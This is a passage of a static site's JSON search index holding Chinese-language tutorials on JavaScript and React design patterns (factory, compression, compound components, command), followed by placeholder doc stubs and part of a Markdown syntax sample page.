函数轻松创建多个用户。\n如果要创建相对复杂和可配置的对象，工厂模式会很有用。\n键和值的值可能依赖于特定环境或配置。\n使用工厂模式，可以轻松创建包含自定义键和值的新对象！\nconst createObjectFromArray = ([key, value]) =\u0026gt; ({\r[key]: value\r});\rcreateObjectFromArray([\u0026#34;name\u0026#34;, \u0026#34;John\u0026#34;]); // { name: \u0026#34;John\u0026#34; } \r优点 当我们必须创建多个共享相同属性的较小对象时，工厂模式很有用。\n工厂函数可以根据当前环境或用户特定的配置轻松返回自定义对象。\n大多数情况下，这就是您所需要的，但因为这是 JavaScript，所以还有另一种方法让它感觉更像 Java：class关键字。\nclass User {\rconstructor(firstName, lastName, email) {\rthis.firstName = firstName;\rthis.lastName = lastName;\rthis.email = email;\r}\rfullName() {\rreturn `${this.firstName} ${this.lastName}`;\r}\r}\rconst user1 = new User({\rfirstName: \u0026#34;John\u0026#34;,\rlastName: \u0026#34;Doe\u0026#34;,\remail: \u0026#34;john@doe.com\u0026#34;\r});\rconst user2 = new User({\rfirstName: \u0026#34;Jane\u0026#34;,\rlastName: \u0026#34;Doe\u0026#34;,\remail: \u0026#34;jane@doe.com\u0026#34;\r}); 在 JavaScript 中，类比工厂更加冗长和限制，并且在重构方面有点雷区，但它们也被 React 和 Angular 等主要前端框架所接受，并且有一些罕见的用途- 使复杂性值得的案例。\n “有时，优雅的实现只是一个功能。不是方法。不是一个类。不是框架。只是一个功能。” ~ 约翰 卡马克\n 从最简单的实现开始，仅在需要时转向更复杂的实现。\n\r缺点 但是，在许多情况下，每次创建新实例而不是新对象可能会更消耗内存。\n\r知识点   对象字面量 {}\n  当一个函数在不使用 new 关键字的情况下返回一个新对象时，它就是一个工厂函数！\n  ","description":"使用工厂函数来创建对象","id":132,"section":"react-patterns","tags":null,"title":"工厂模式","uri":"https://codthing.github.io/react-patterns/design-patterns/factory-pattern/"},{"content":"压缩 JavaScript 并密切关注块大小以获得最佳性能。\n过高的 JavaScript 包粒度有助于重复数据删除和缓存，但可能会在 50-100 个块范围内受到较差的压缩和影响加载（由于浏览器进程、缓存检查等）。\n最终，选择最适合您的压缩策略。\nJavaScript 是页面大小的第二大贡献者，也是互联网上仅次于图像的第二大请求量。\n减少 JavaScript 传输、加载和执行时间的模式来提高网站性能。 压缩有助于减少通过网络传输脚本所需的时间。\n将压缩与其他技术（例如缩小、代码拆分、捆绑、缓存和延迟加载）结合使用，以减少大量 JavaScript 对性能的影响。\n然而，这些技术的目标有时会相互矛盾。\n本节探讨 JavaScript 压缩技术，并讨论在决定代码拆分和压缩策略时应考虑的细微差别。\n  Gzip 和 Brotli 是压缩 JavaScript 的最常用方法，并且被现代浏览器广泛支持。\n  Brotli 在类似的压缩级别下提供更好的压缩率。\n  Next.js 默认提供 Gzip 压缩。 但建议在像 Nginx 这样的 HTTP 代理上启用它。\n  如果使用 Webpack 来捆绑代码，可以使用 CompressionPlugin 进行 Gzip 压缩或使用 BrotliWebpackPlugin 进行 Brotli 压缩。\n  在切换到 Brotli 压缩而不是 Gzip 后，Oyo 的文件大小减少了 15-20%，Wix 的文件大小减少了 21-25%。\n  compress(a + b) \u0026lt;= compress(a) + compress(b) - 单个大包比多个小包提供更好的压缩。 这会导致重复数据删除和缓存与浏览器性能和压缩不一致的粒度权衡。 粒度分块可以帮助处理这种权衡。\n  \rHTTP 压缩 压缩可减小文档和文件的大小，因此它们占用的磁盘空间比原始文件少。\n较小的文档消耗较低的带宽，并且可以通过网络快速传输。\nHTTP 压缩使用这个简单的概念来压缩网站内容、减少页面权重、降低带宽要求并提高性能。\nHTTP 数据压缩可以按不同方式分类。其中之一是有损与无损。\n有损压缩意味着压缩-解压缩循环会在保留其可用性的同时产生稍微改变的文档。最终用户几乎察觉不到这种变化。最常见的有损压缩示例是图像的 JPEG 压缩。\n使用无损压缩，压缩和解压后恢复的数据将与原始数据精确匹配。 PNG 图像是无损压缩的一个例子。无损压缩与文本传输相关，基于文本的格式，例如 HTML、CSS 和 JavaScript。\n由于希望浏览器上所有有效的 JS 代码，应该对 JavaScript 代码使用无损压缩算法。\n在压缩 JS 之前，缩小有助于消除不必要的语法并将其减少到仅执行所需的代码。\n\r缩小 为了减少负载大小，可以在压缩之前缩小 JavaScript。\n缩小通过删除空格和任何不必要的代码来创建一个更小但完全有效的代码文件来补充压缩。\n在编写代码时，我们使用换行、缩进、空格、命名良好的变量和注释来提高代码的可读性和可维护性。\n但是，这些元素会影响 JavaScript 的整体大小，并且不是在浏览器上执行所必需的。\n缩小将 JavaScript 代码减少到成功执行所需的最低限度。\n缩小是 JS 和 CSS 优化的标准做法。\nJavaScript 库开发人员通常会为生产部署提供其文件的缩小版本，通常用 min.js 扩展名表示。 （例如，jquery.js 和 jquery.min.js）\n有多种工具可用于缩小 HTML、CSS 和 JS 资源。\nTerser 是 ES6+ 的流行 JavaScript 压缩工具，Webpack v4 默认为这个库包含一个插件，用于创建缩小的构建文件。\n还可以将 TerserWebpackPlugin 与旧版本的 Webpack 一起使用，或者将 Terser 用作没有模块捆绑器的 CLI 工具。\n\r静态与动态压缩 缩小有助于显着减小文件大小，但 JS 的压缩可以提供更显着的收益。\n可以通过两种方式实现服务器端压缩。\n静态压缩：可以使用静态压缩来预压缩资源并在构建过程中提前保存它们。\n在这种情况下，可以使用更高的压缩级别来缩短代码的下载时间。\n高构建时间不会影响网站性能。如果对不经常更改的文件使用静态压缩，那将是最好的。\n动态压缩：通过这个过程，当浏览器请求资源时，压缩会即时进行。\n动态压缩更容易实现，但只能使用较低的压缩级别。\n更高的压缩级别将需要更多的时间，并且将失去从较小的内容大小中获得的优势。\n如果对经常更改或由应用程序生成的内容使用动态压缩，这将有所帮助。\n可以根据应用程序内容的类型使用静态或动态压缩。\n可以使用流行的压缩算法启用静态和动态压缩，但每种情况下推荐的压缩级别是不同的。\n让我们看看压缩算法以更好地理解这一点。\n\r压缩算法 Gzip 和 Brotli 是当今用于压缩 HTTP 数据的两种最常用的算法。\nGzip Gzip 压缩格式已经存在近 30 年，是一种基于 Deflate 算法的无损算法。 deflate 算法本身对输入数据流中的数据块使用 LZ77 算法和霍夫曼编码的组合。\nLZ77 算法识别重复的字符串并用反向引用替换它们，反向引用是指向它先前出现的位置的指针，后跟字符串的长度。 随后，霍夫曼编码识别出常用的引用并将它们替换为具有较短位序列的引用。 较长的位序列用于表示不经常使用的引用。\n所有主流浏览器都支持 Gzip。\nZopfli 压缩算法是 Deflate/Gzip 的较慢但改进的版本，生成更小的 GZip 兼容文件。 它最适合静态压缩，可以提供更显着的收益。\nBrotli 2015年，谷歌推出了Brotli算法和Brotli压缩数据格式。\n与 GZip 一样，Brotli 也是一种基于 LZ77 算法和霍夫曼编码的无损算法。\n此外，它使用二阶上下文建模以类似的速度产生更密集的压缩。\n上下文建模是一项功能，它允许在同一块中为同一字母表使用多个哈夫曼树。\nBrotli 还支持用于反向引用的更大窗口大小，并具有静态字典。 这些功能有助于提高其作为压缩算法的效率。\nBrotli 受到当今所有主要服务器和浏览器的支持，并且正变得越来越流行。\n它还受托管提供商和中间件（包括 Netlify、AWS 和 Vercel）的支持并且可以轻松启用。\n拥有庞大用户群的网站，例如 OYO 和 Wix，在将 Gzip 替换为 Brotli 后，其性能有了很大的提升。\nGzip vs Brotli 下表显示了不同压缩级别下 Brotli 和 Gzip 压缩率和速度的基准比较。\n此外，以下是 Chrome 对使用 Gzip 和 Brotli 压缩 JS 的研究的一些见解\n  Gzip 9 的压缩率最好，压缩速度也不错，在使用其他级别的 Gzip 之前应该考虑使用它。\n  对于 Brotli，请考虑 6-11 级。 否则，我们可以使用 Gzip 更快地实现类似的压缩率。\n  在所有大小范围内，Brotli 9-11 的性能都比 Gzip 好得多，但速度很慢。\n  捆绑包越大，您将获得更好的压缩率和速度。\n  对于所有包大小，算法之间的关系都是相似的（例如，对于每个包大小，Brotli 7 都优于 Gzip 9，对于所有大小范围，Gzip 9 都比 Brotli 5 快）。\n  现在让我们来看看服务器和浏览器之间关于所选压缩格式的通信。\n\r启用压缩 可以在构建过程中启用静态压缩。\n如果使用 Webpack 来捆绑您的代码，可以使用 CompressionPlugin 进行 Gzip 压缩或使用 BrotliWebpackPlugin 进行 Brotli 压缩。\n该插件可以包含在 Webpack 配置文件中，如下所示。\nmodule.exports = {\r//...\rplugins: [\r//...\rnew CompressionPlugin()\r]\r} Next.js 默认提供 Gzip 压缩，但建议在像 Nginx 这样的 HTTP 代理上启用它。\nVercel 平台在代理级别支持 Gzip 和 Brotli。\n可以在支持不同压缩算法的服务器（包括 Node.js）上启用动态无损压缩。\n浏览器通过请求中的 Accept-Encoding HTTP 标头传达它支持的压缩算法。 例如，\nAccept-Encoding: gzip, br 这表明浏览器支持 Gzip 和 Brotli。\n可以按照特定服务器类型的说明在服务器上启用不同类型的压缩。\n例如，可以在此处找到在 Apache 服务器上启用 Brotli 的说明。\nExpress 是一个流行的 Node 网络框架，并提供了一个压缩中间件库。\n使用它来在请求时压缩任何资产。\nBrotli 比其他压缩算法更受推荐，因为它生成的文件更小。\n对于不支持 Brotli 的浏览器，可以启用 Gzip 作为后备。 如果配置成功，服务器将返回 Content-Encoding HTTP 响应头以指示响应中使用的压缩算法。 例如，\nContent-Encoding: br \r审计压缩 可以在 Chrome -\u0026gt; DevTools -\u0026gt; network -\u0026gt; Headers 中检查服务器是否压缩了下载的脚本或文本。\nDevTools 显示响应中使用的内容编码，如下所示。\nLighthouse 报告包括对“启用文本压缩”的性能审计，该审计检查接收到的基于文本的资源类型，而内容编码标头未设置为“br”、“gzip”或“deflate”。\nLighthouse 使用 Gzip 来计算资源的潜在节省。\n\rJavaScript 压缩和加载粒度 要全面掌握 JavaScript 压缩的效果，还必须考虑 JavaScript 优化的其他方面，例如基于路由的拆分、代码拆分和捆绑。\n具有大量 JavaScript 代码的现代 Web 应用程序通常使用不同的代码拆分和捆绑技术来有效地加载代码。\n应用程序使用逻辑边界来拆分代码，例如单页应用程序的路由级别拆分或在交互或视口可见性上增量地提供 JavaScript。 可以配置捆绑器以识别这些边界。\n在继续讨论这如何影响压缩之前，先介绍一些与代码拆分和捆绑相关的基本定义。\n\r捆绑术语 以下是与我们的讨论相关的一些关键术语。\n  Module：模块是离散的功能块，旨在提供可靠的抽象和封装。 有关更多详细信息，请参阅模块模式。\n  Bundle：一组不同的模块，包含源文件的最终版本，并且已经在打包器中进行了加载和编译过程。\n  Bundle splitting：捆绑器使用的过程将应用程序拆分为多个捆绑包，以便每个捆绑包都可以独立、发布、下载或缓存。\n  chunk：从 Webpack 术语中采用，块是捆绑和代码拆分过程的最终输出。 Webpack 可以根据入口配置、SplitChunksPlugin 或动态导入将包拆分为块。\n  如果模块包含在源文件中，则在代码或包拆分后构建过程的最终输出称为 chunk。 请注意，源文件和 chunk 可能相互依赖。\nJavaScript 的输出大小是指经过 JavaScript 打包器或编译器优化后的块大小或原始大小。\n大型 JS 应用程序可以解构为可独立加载的 JavaScript 文件块。\n加载粒度是指输出块的数量——块的数量越多，每个块的大小越小，粒度越高。\n一些块比其他块更重要，因为它们加载更频繁或者是更有影响力的代码路径的一部分（例如，加载“结帐”小部件）。\n知道哪些块最重要需要应用知识，尽管可以安全地假设“基本”块总是必不可少的。\n页面所需的块的每个字节都需要由用户设备下载和解析/执行。\n这是直接影响应用程序性能的代码。由于块是最终将被下载的代码，因此压缩块可以提高下载速度。\n在此背景下，让我们讨论加载粒度和压缩之间的相互作用。\n\r粒度权衡 在理想的世界中，粒度和分块策略应旨在实现以下相互矛盾的目标。\n 提高下载速度：  如前几节所示，可以使用压缩来提高下载速度。 但是，与使用相同的代码压缩多个小块相比，压缩一个大块会产生更好的结果或更小的文件大小。\ncompress(a + b) \u0026lt;= compress(a) + compress(b)\n mited 本地数据表明较小块的损失为 5% 到 10%。 非捆绑块的极端情况显示大小增加了 20%。 额外的 IPC、I/O 和处理成本附加到在较大块的情况下共享的每个块。 v8 引擎具有 30K 流/解析阈值。 这意味着所有小于 30K 的块都会在关键加载路径上解析，即使它是非关键的。\n  由于上述原因，对于优化下载和浏览器性能的相同代码，较大的块可能比较小的块更有效。\n 提高缓存命中率和缓存效率：较小的块导致更好的缓存效率，特别是对于增量加载 JS 的应用程序。    更改被隔离到具有较小块的较少块中。 如果有代码变化，只需要重新下载受影响的chunk，而这些对应的代码大小很可能很小。 剩余的块可以在缓存中找到，从而增加缓存命中的次数。\n  对于较大的块，很可能会影响较大的代码，并需要在代码更改后重新下载。\n因此，希望使用更小的块来利用缓存机制。\n  执行快 - 对于快速执行的代码，它应该满足以下条件。    所有必需的依赖项都很容易获得 - 它们已经一起下载或在缓存中可用。 这意味着您应该将所有相关代码捆绑在一起作为一个更大的块。\n  只有页面/路由所需的代码才能执行。 这要求不下载或执行额外的代码。 包含公共依赖项的公共块可能具有大多数但不是所有页面所需的依赖项。 重复代码删除需要较小的独立块。\n  主线程上的长任务会阻塞很长时间。 因此，这些需要分解成更小的块。\n  如上面的三角形所示，尝试优化上述目标之一的加载粒度可能会使您远离其他目标。 这就是粒度权衡的问题\n重复数据删除和缓存与浏览器性能和压缩不一致。\n由于这种权衡，当今大多数生产应用程序使用的最大块数约为 10。\n需要增加此限制以支持对具有大量 JavaScript 的应用程序更好的缓存和重复数据删除。\n\rSplitChunksPlugin 和 Granular chunking 粒度权衡的潜在解决方案将满足以下要求。\n  允许使用更小块大小的更多块（40 到 100），以便在不影响性能的情况下实现更好的缓存和重复数据删除。\n  由于 IPC、I/O 和许多脚本标签的处理成本，解决了多个较小块的性能开销。\n  在多个较小块的情况下解决压缩损失。\n  满足这些要求的潜在解决方案仍在开发中。 但是，Webpack v4 的 SplitChunksPlugin 和粒度分块策略可以在一定程度上帮助提高加载粒度。\n早期版本的 Webpack 使用 CommonsChunkPlugin 将公共依赖项或共享模块捆绑到单个块中。 对于不使用这些通用模块的页面，这可能会导致不必要的下载和执行时间增加。 为了更好地优化此类页面，Webpack 在 v4 中引入了 SplitChunksPlugin。 根据默认值或配置创建多个拆分块，以防止跨各种路由获取重复代码。\nNext.js 采用了 SplitChunksPlugin 并实现了以下粒度分块策略来生成解决粒度权衡的 Webpack 块。\n  任何足够大的第三方模块（大于 160 KB）都被分成一个单独的块。\n  为框架依赖项创建了一个单独的框架块。 (react、react-dom 等等)\n  根据需要创建尽可能多的共享块。 （最多 25 个）\n  要生成的块的最小大小更改为 20 KB。\n  发出多个共享块而不是单个块可以最大限度地减少在不同页面上下载或执行的不必要（或重复）代码的数量。 为大型第三方库生成独立的块可以改进缓存，因为它们不太可能经常更改。 20 kB 的最小块大小可确保压缩损失相当低。\n粒度分块策略帮助几个 Next JS 应用程序减少了站点使用的 JavaScript 总量。\n在 Gatsby 中也实施了粒度分块策略，并观察到了类似的好处。\n\r总结 仅靠压缩并不能解决所有 JavaScript 性能问题，\n但了解浏览器和打包器在幕后的工作方式有助于创建更好的打包策略，以支持更好的压缩。\n加载粒度问题需要跨生态系统中的不同平台解决。\n粒度分块可能是朝着这个方向迈出的一步，但我们还有很长的路要走。\n\r知识点    ","description":"减少通过网络传输脚本所需的时间","id":133,"section":"react-patterns","tags":null,"title":"压缩 JavaScript","uri":"https://codthing.github.io/react-patterns/performance-patterns/%E5%8E%8B%E7%BC%A9-javascript/"},{"content":"在应用程序中，经常有属于彼此的组件。\n它们通过共享状态相互依赖，并共享逻辑。\n经常会在选择、下拉组件或菜单项等组件中看到这一点。\n复合组件模式允许创建所有一起工作以执行任务的组件。\n\rContext API 让我们看一个例子：\n我们有一个松鼠图像列表！ 除了只显示松鼠图像之外，我们还想添加一个按钮，使用户可以编辑或删除图像。\n我们可以实现一个 FlyOut 组件，当用户切换组件时显示一个列表。\n在 FlyOut 组件中，我们基本上拥有三样东西：\n FlyOut 包装器，其中包含切换按钮和列表 Toggle 按钮，用于切换列表 List ，其中包含菜单项列表  使用复合组件模式和 React 的 Context API 非常适合这个例子！\n首先，让我们创建 FlyOut 组件。 该组件保持状态，并将带有切换值的 FlyOutProvider 返回给它接收到的所有子项。\nconst FlyOutContext = createContext();\rfunction FlyOut(props) {\rconst [open, toggle] = useState(false);\rconst providerValue = { open, toggle };\rreturn (\r\u0026lt;FlyOutContext.Provider value={providerValue}\u0026gt;\r{props.children}\r\u0026lt;/FlyOutContext.Provider\u0026gt;\r);\r} 我们现在有一个有状态的 FlyOut 组件，可以将 open 和 toggle 的值传递给它的孩子！\n让我们创建 Toggle 组件。 该组件只是呈现用户可以单击以切换菜单的组件。\nfunction Toggle() {\rconst { open, toggle } = useContext(FlyOutContext);\rreturn (\r\u0026lt;div onClick={() =\u0026gt; toggle(!open)}\u0026gt;\r\u0026lt;Icon /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 为了真正让 Toggle 访问 FlyOutContext 提供者，我们需要将它呈现为 FlyOut 的子组件！\n我们可以简单地将其渲染为子组件。\n然而，我们也可以让 Toggle 组件成为 FlyOut 组件的一个属性！\nconst FlyOutContext = createContext();\rfunction FlyOut(props) {\rconst [open, toggle] = useState(false);\rreturn (\r\u0026lt;FlyOutContext.Provider value={{ open, toggle }}\u0026gt;\r{props.children}\r\u0026lt;/FlyOutContext.Provider\u0026gt;\r);\r}\rfunction Toggle() {\rconst { open, toggle } = useContext(FlyOutContext);\rreturn (\r\u0026lt;div onClick={() =\u0026gt; toggle(!open)}\u0026gt;\r\u0026lt;Icon /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rFlyOut.Toggle = Toggle; 这意味着如果我们想在任何文件中使用 FlyOut 组件，我们只需要导入 FlyOut！\nimport React from \u0026#34;react\u0026#34;;\rimport { FlyOut } from \u0026#34;./FlyOut\u0026#34;;\rexport default function FlyoutMenu() {\rreturn (\r\u0026lt;FlyOut\u0026gt;\r\u0026lt;FlyOut.Toggle /\u0026gt;\r\u0026lt;/FlyOut\u0026gt;\r);\r} 仅仅切换是不够的。 我们还需要一个包含列表项的 List，它根据 open 的值打开和关闭。\nfunction List({ children }) {\rconst { open } = React.useContext(FlyOutContext);\rreturn open \u0026amp;\u0026amp; \u0026lt;ul\u0026gt;{children}\u0026lt;/ul\u0026gt;;\r}\rfunction Item({ children }) {\rreturn \u0026lt;li\u0026gt;{children}\u0026lt;/li\u0026gt;;\r} List 组件根据 open 的值是 true 还是 false 呈现其子项。\n让我们将 List 和 Item 作为 FlyOut 组件的属性，就像我们对 Toggle 组件所做的那样。\nconst FlyOutContext = createContext();\rfunction FlyOut(props) {\rconst [open, toggle] = useState(false);\rreturn (\r\u0026lt;FlyOutContext.Provider value={{ open, toggle }}\u0026gt;\r{props.children}\r\u0026lt;/FlyOutContext.Provider\u0026gt;\r);\r}\rfunction Toggle() {\rconst { open, toggle } = useContext(FlyOutContext);\rreturn (\r\u0026lt;div onClick={() =\u0026gt; toggle(!open)}\u0026gt;\r\u0026lt;Icon /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rfunction List({ children }) {\rconst { open } = useContext(FlyOutContext);\rreturn open \u0026amp;\u0026amp; \u0026lt;ul\u0026gt;{children}\u0026lt;/ul\u0026gt;;\r}\rfunction Item({ children }) {\rreturn \u0026lt;li\u0026gt;{children}\u0026lt;/li\u0026gt;;\r}\rFlyOut.Toggle = Toggle;\rFlyOut.List = List;\rFlyOut.Item = Item; 我们现在可以将它们用作 FlyOut 组件的属性！\n在这种情况下，我们希望向用户显示两个选项：编辑和删除。\n让我们创建一个 FlyOut.List 来呈现两个 FlyOut.Item 组件，一个用于编辑选项，一个用于删除选项。\nimport React from \u0026#34;react\u0026#34;;\rimport { FlyOut } from \u0026#34;./FlyOut\u0026#34;;\rexport default function FlyoutMenu() {\rreturn (\r\u0026lt;FlyOut\u0026gt;\r\u0026lt;FlyOut.Toggle /\u0026gt;\r\u0026lt;FlyOut.List\u0026gt;\r\u0026lt;FlyOut.Item\u0026gt;Edit\u0026lt;/FlyOut.Item\u0026gt;\r\u0026lt;FlyOut.Item\u0026gt;Delete\u0026lt;/FlyOut.Item\u0026gt;\r\u0026lt;/FlyOut.List\u0026gt;\r\u0026lt;/FlyOut\u0026gt;\r);\r} Perfect！ 我们刚刚创建了一个完整的 FlyOut 组件，而没有在 FlyOutMenu 本身中添加任何状态！\n当您构建组件库时，复合模式非常有用。 在使用语义 UI 等 UI 库时，您会经常看到这种模式。\n\rReact.Children.map 我们还可以通过映射组件的子组件来实现复合组件模式。\n我们可以将 open 和 toggle 属性添加到这些元素中，通过使用额外的 props 克隆它们。\nexport function FlyOut(props) {\rconst [open, toggle] = React.useState(false);\rreturn (\r\u0026lt;div\u0026gt;\r{React.Children.map(props.children, child =\u0026gt;\rReact.cloneElement(child, { open, toggle })\r)}\r\u0026lt;/div\u0026gt;\r);\r} 所有子组件都被克隆，并传递了 open 和 toggle 的值。\n不必像前面的例子那样使用 Context API，我们现在可以通过 props 访问这两个值。\n\r优点 复合组件管理它们自己的内部状态，它们在几个子组件之间共享。\n在实现复合组件时，我们不必担心自己管理状态。\n导入复合组件时，我们不必显式导入该组件上可用的子组件。\nimport { FlyOut } from \u0026#34;./FlyOut\u0026#34;;\rexport default function FlyoutMenu() {\rreturn (\r\u0026lt;FlyOut\u0026gt;\r\u0026lt;FlyOut.Toggle /\u0026gt;\r\u0026lt;FlyOut.List\u0026gt;\r\u0026lt;FlyOut.Item\u0026gt;Edit\u0026lt;/FlyOut.Item\u0026gt;\r\u0026lt;FlyOut.Item\u0026gt;Delete\u0026lt;/FlyOut.Item\u0026gt;\r\u0026lt;/FlyOut.List\u0026gt;\r\u0026lt;/FlyOut\u0026gt;\r);\r} \r缺点 当使用 React.Children.map 提供值时，组件嵌套是有限的。\n只有父组件的直接子组件才能访问 open 和 toggle 道具，这意味着我们不能将这些组件中的任何一个包装在另一个组件中。\nexport default function FlyoutMenu() {\rreturn (\r\u0026lt;FlyOut\u0026gt;\r{/* This breaks */}\r\u0026lt;div\u0026gt;\r\u0026lt;FlyOut.Toggle /\u0026gt;\r\u0026lt;FlyOut.List\u0026gt;\r\u0026lt;FlyOut.Item\u0026gt;Edit\u0026lt;/FlyOut.Item\u0026gt;\r\u0026lt;FlyOut.Item\u0026gt;Delete\u0026lt;/FlyOut.Item\u0026gt;\r\u0026lt;/FlyOut.List\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/FlyOut\u0026gt;\r);\r} 使用 React.cloneElement 克隆元素执行浅合并。 已经存在的道具将与我们传递的新道具合并在一起。\n如果已经存在的 prop 与我们传递给 React.cloneElement 方法的 props 具有相同的名称，这可能会导致命名冲突。\n由于 props 是浅合并的，props 的值将被我们传递的最新值覆盖。\n\r知识点  createContext() useContext() Provider React.Children.map()  ","description":"创建协同工作以执行单个任务的多个组件","id":134,"section":"react-patterns","tags":null,"title":"复合模式","uri":"https://codthing.github.io/react-patterns/design-patterns/compound-pattern/"},{"content":"使用命令模式，我们可以将执行特定任务的对象与调用该方法的对象解耦。\n\r订单管理案例 假设我们有一个在线食品配送平台。 用户可以下订单、跟踪订单和取消订单。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  class OrderManager() { constructor() { this.orders = [] } placeOrder(order, id) { this.orders.push(id) return `您已成功订购 ${order}(${id})`; } trackOrder(id) { return `您的订单 ${id}将在 20 分钟内送达。` } cancelOrder(id) { this.orders = this.orders.filter(order =\u0026gt; order.id !== id) return `您已取消订单 ${id}` } }   在 OrderManager 类中，我们可以访问 placeOrder、trackOrder 和 cancelOrder 方法。\nconst manager = new OrderManager();\rmanager.placeOrder(\u0026#34;Pad Thai\u0026#34;, \u0026#34;1234\u0026#34;);\rmanager.trackOrder(\u0026#34;1234\u0026#34;);\rmanager.cancelOrder(\u0026#34;1234\u0026#34;); 但是，直接在管理器实例上调用方法也有缺点。\n可能会发生我们决定稍后重命名某些方法，或者方法的功能发生变化的情况。\n假设我们现在将其重命名为 addOrder，而不是将其称为 placeOrder！ 这意味着我们必须确保不会在代码库的任何地方调用 placeOrder 方法，这在较大的应用程序中可能非常棘手。\n将方法与管理器对象分离 \u0026ndash; 命令函数 相反，我们希望将方法与管理器对象分离，并为每个命令创建单独的命令函数！\n让我们重构 OrderManager 类：它没有 placeOrder、cancelOrder 和 trackOrder 方法，而是只有一个方法：execute。 此方法将执行它给出的任何命令。\n每个命令都应该可以访问 OrderManager 的 orders，我们将其作为它的第一个参数传递。\n1 2 3 4 5 6 7 8 9 10  class OrderManager { constructor() { this.orders = []; } execute(command, ...args) { return command.execute(this.orders, ...args); } }   我们需要为订单管理器创建三个命令：\n PlaceOrderCommand CancelOrderCommand TrackOrderCommand  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  class OrderManager { constructor() { this.orders = []; } execute(command, ...args) { return command.execute(this.orders, ...args); } } class Command { constructor(execute) { this.execute = execute; } } function PlaceOrderCommand(order, id) { return new Command(orders =\u0026gt; { orders.push(id); return `您已成功订购 ${order}(${id})`; }); } function CancelOrderCommand(id) { return new Command(orders =\u0026gt; { orders = orders.filter(order =\u0026gt; order.id !== id); return `您已取消订单 ${id}`; }); } function TrackOrderCommand(id) { return new Command(() =\u0026gt; `您的订单 ${id}将在 20 分钟内送达。`); }   \r优点 命令模式允许我们将方法与执行操作的对象分离。\n如果您正在处理具有特定生命周期的命令，或者应该在特定时间排队和执行的命令，它会给您更多的控制权。\n\r缺点 命令模式的用例非常有限，并且经常向应用程序添加不必要的样板。\n\r知识点  class 递归 Array.prototype.push() Array.prototype.filter()  ","description":"通过向指挥官发送命令来解耦执行任务的方法","id":135,"section":"react-patterns","tags":null,"title":"命令模式","uri":"https://codthing.github.io/react-patterns/design-patterns/command-pattern/"},{"content":"Markdown here\n","description":"test post","id":136,"section":"docs","tags":null,"title":"Related content","uri":"https://codthing.github.io/docs/relatedcontent/"},{"content":"Markdown here\n","description":"test post","id":137,"section":"docs","tags":null,"title":"Page Resources","uri":"https://codthing.github.io/docs/pageresources/"},{"content":"Markdown here\n","description":"test post","id":138,"section":"docs","tags":null,"title":"Page Bundles","uri":"https://codthing.github.io/docs/pagebundles/"},{"content":"Markdown here\n","description":"test post","id":139,"section":"docs","tags":null,"title":"Content Formats","uri":"https://codthing.github.io/docs/contentfortmats/"},{"content":"Markdown here\n","description":"test post","id":140,"section":"docs","tags":null,"title":"Image Processing","uri":"https://codthing.github.io/docs/imageprocessing/"},{"content":"Markdown here\n","description":"test post","id":141,"section":"docs","tags":null,"title":"Shortcodes","uri":"https://codthing.github.io/docs/contentmanagement/shortcodes/"},{"content":"Markdown here\n","description":"test post","id":142,"section":"docs","tags":null,"title":"Frontmatter","uri":"https://codthing.github.io/docs/contentmanagement/frontmatter/"},{"content":"Lorem est tota propiore conpellat pectoribus de\npectora summo. Redit teque digerit hominumque toris verebor lumina non cervice\nsubde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc\ncaluere tempus\nThis article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\n\rHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution  Tiam, ad mint andaepu dandae nostion secatur sequo quae.\nNote that you can use Markdown syntax within a blockquote.\n Blockquote with attribution  Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\n Tables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\n   Name Age     Bob 27   Alice 23    Inline Markdown within tables    Inline  Markdown  In  Table     italics bold strikethrough  code    Code Blocks Code block with backticks html\r\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r Code block with Hugo\u0026rsquo;s internal 